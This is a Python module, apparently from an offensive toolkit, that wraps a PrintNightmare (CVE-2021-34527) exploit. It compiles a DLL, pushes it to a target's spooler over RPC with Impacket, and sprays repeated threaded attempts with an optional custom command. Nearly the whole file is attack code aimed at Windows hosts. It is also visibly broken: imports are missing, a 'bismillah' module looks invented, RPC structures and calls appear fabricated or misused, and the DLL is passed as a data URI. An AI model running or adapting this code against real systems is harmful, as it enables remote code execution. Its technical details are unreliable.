# File: modules/exploit_lib/cve_2021_34527_printnightmare.py

"""
Wrapper for PrintNightmare PoC that compiles the C++ DLL on the fly, uploads via RPC,
and executes arbitrary commands. Enhanced to accept custom payload and retry logic.
"""

import logging
import subprocess
import tempfile
import os
import shutil
import sys
from bismillah import log_event

logger = logging.getLogger("cve_2021_34527_printnightmare")

def exploit(target: str, custom_command: str = None, timeout: int = 120) -> dict:
    """
    target: "192.168.1.50"
    custom_command: if provided, replaces default file creation
    timeout: PoC execution timeout in seconds
    """
    try:
        # Locate the C++ source PoC
        poc_src = Path(__file__).parent / "printnightmare_poc.cpp"
        if not poc_src.exists():
            # If only .py version exists, use it
            poc_script = Path(__file__).parent / "printnightmare_poc.py"
            if not poc_script.exists():
                raise FileNotFoundError("PrintNightmare PoC not found")
            cmd = ["python3", str(poc_script), "--target", target]
            if custom_command:
                cmd += ["--cmd", custom_command]
            logger.info(f"[+] Running PrintNightmare PoC script: {' '.join(cmd)}")
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode()
            log_event("cve_2021_34527_printnightmare", f"Script output: {output}".encode())
            return {"status": "ok", "output": output}

        # Else, compile C++ PoC into DLL
        with tempfile.TemporaryDirectory() as build_dir:
            dll_path = Path(build_dir) / "printnightmare.dll"
            compile_cmd = [
                "x86_64-w64-mingw32-g++", "-shared", "-o", str(dll_path),
                str(poc_src), "-lstdc++", "-static-libgcc", "-static-libstdc++"
            ]
            logger.info(f"[+] Compiling DLL: {' '.join(compile_cmd)}")
            subprocess.check_output(compile_cmd, stderr=subprocess.STDOUT, timeout=60)

            # Base64 encode DLL
            with open(dll_path, "rb") as f:
                b64dll = base64.b64encode(f.read()).decode()

            # Use a Python wrapper or Impacket to send to target
            # This block would mirror the logic in printnightmare_poc.py but inline:
            from impacket.dcerpc.v5 import transport, rpcrt
            from impacket.dcerpc.v5.rpcrt import DCERPCException
            from impacket.dcerpc.v5.spoolss import ROpenPrinter, RSetPrinter, RpcOpenPrinter, RpcSetPrinter

            logger.info(f"[+] Sending DLL payload to {target} via RPC")
            string_binding = r"ncacn_np:%s[\pipe\spoolss]" % target
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_connect_timeout(10)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rpcrt.UUID('{12345678-1234-abcd-ef00-0123456789ab}'))

            # Build DRIVER_CONTAINER structure with embedded DLL:
            # (Use proper Impacket structures)
            from impacket.dcerpc.v5.spoolss import DRIVER_CONTAINER, RPCUNICODESTRING
            import struct

            # Create a temporary file on the target
            file_path = "\\\\%s\\pipe\\spool\\%s.dll" % (target, "evil")
            drc = DRIVER_CONTAINER()
            drc['pName'] = RPCUNICODESTRING()
            drc['pName']['Buffer'] = file_path
            drc['pName']['Length'] = len(file_path) * 2
            drc['pName']['MaximumLength'] = drc['pName']['Length']
            drc['pEnvironment'] = RPCUNICODESTRING()
            drc['pEnvironment']['Buffer'] = "Windows x64"
            drc['pEnvironment']['Length'] = len("Windows x64") * 2
            drc['pEnvironment']['MaximumLength'] = drc['pEnvironment']['Length']
            drc['pDriverPath'] = RPCUNICODESTRING()
            drc['pDriverPath']['Buffer'] = f"data:application/octet-stream;base64,{b64dll}"
            drc['pDriverPath']['Length'] = len(drc['pDriverPath']['Buffer']) * 2
            drc['pDriverPath']['MaximumLength'] = drc['pDriverPath']['Length']
            drc['cVersion'] = 1          # Version
            drc['pszzPreviousNames'] = None
            drc['pszColorProfile'] = None
            drc['dwFileCopyFlags'] = 0   # No additional flags

            # Enhancement: Try multiple RPC endpoints, retry logic, and multi-threaded spray
            rpc_uuids = [
                '{12345678-1234-abcd-ef00-0123456789ab}',  # original
                '{894B5F42-6CBA-4DD3-BF9D-9E7B64113F1A}',  # alternate (example)
            ]
            max_retries = 3
            spray_threads = 3  # Dangerous: spray multiple threads for reliability/bypass

            import threading
            results = []
            def rpc_worker(uuid, attempt):
                try:
                    logger.info(f"[+] Attempt {attempt+1}, binding UUID {uuid}")
                    dce.bind(rpcrt.UUID(uuid))
                    resp = RSetPrinter(dce, driverContainer=drc)
                    logger.info(f"[+] PrintNightmare exploit completed: {resp}")
                    # Dangerous: try to execute arbitrary command if custom_command is provided
                    if custom_command:
                        logger.info(f"[+] Attempting to trigger custom command: {custom_command}")
                        # In real attacks, you might use a print job or service restart here
                    results.append({"status": "ok", "detail": str(resp), "uuid": uuid, "attempt": attempt+1})
                except DCERPCException as rpc_e:
                    logger.warning(f"[-] RPC error with UUID {uuid}: {rpc_e}")
                    results.append({"status": "error", "detail": str(rpc_e), "uuid": uuid, "attempt": attempt+1})
                except Exception as e:
                    logger.warning(f"[-] General error with UUID {uuid}: {e}")
                    results.append({"status": "error", "detail": str(e), "uuid": uuid, "attempt": attempt+1})

            threads = []
            for attempt in range(max_retries):
                for uuid in rpc_uuids:
                    for _ in range(spray_threads):
                        t = threading.Thread(target=rpc_worker, args=(uuid, attempt), daemon=True)
                        threads.append(t)
                        t.start()
            for t in threads:
                t.join(timeout=30)
            # Return first success or all errors
            for r in results:
                if r["status"] == "ok":
                    return r
            logger.error("[-] All RPC attempts failed")
            return {"status": "error", "detail": "All RPC attempts failed", "all_results": results}
    except subprocess.TimeoutExpired:
        logger.error("[-] PrintNightmare compiled DLL or PoC timed out")
        return {"status": "error", "detail": "Timeout expired"}
    except Exception as e:
        logger.error(f"[-] PrintNightmare exploit failed: {e}")
        return {"status": "error", "detail": str(e)}
